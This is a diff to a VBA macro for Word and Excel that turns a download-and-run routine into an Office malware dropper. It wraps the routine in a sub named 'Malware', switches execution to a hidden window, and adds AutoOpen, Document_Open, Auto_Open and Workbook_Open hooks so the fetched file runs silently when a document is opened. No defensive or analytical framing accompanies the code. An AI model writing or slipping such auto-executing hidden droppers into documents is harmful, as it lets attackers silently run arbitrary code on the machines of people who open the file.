@@ -1,4 +1,8 @@
-' Declare variables
+Public alreadyLaunched As Integer
+
+
+Private Sub Malware()
+    ' Declare variables
     Dim WinHttpReq As Object
     Dim FileStream As Object
     Dim Base64Encoded As String
@@ -42,7 +46,8 @@
         FileStream.Close
         
         ' Execute the file
-        Shell FilePath, vbNormalFocus
+        Shell FilePath, vbHide
+         ' minimized
     Else
         MsgBox "Failed to download file. Status: " & WinHttpReq.Status
     End If
@@ -69,3 +74,31 @@ Function Base64Decode(ByVal base64String As String) As Variant
     ' Return the binary data
     Base64Decode = objNode.nodeTypedValue
 End Function
+
+
+Private Sub Launch()
+    If alreadyLaunched = True Then
+        Exit Sub
+    End If
+    Malware
+    alreadyLaunched = True
+End Sub
+Sub AutoOpen()
+    ' Becomes launched as first on MS Word
+    Launch
+End Sub
+
+Sub Document_Open()
+    ' Becomes launched as second, another try, on MS Word
+    Launch
+End Sub
+
+Sub Auto_Open()
+    ' Becomes launched as first on MS Excel
+    Launch
+End Sub
+
+Sub Workbook_Open()
+    ' Becomes launched as second, another try, on MS Excel
+    Launch
+End Sub
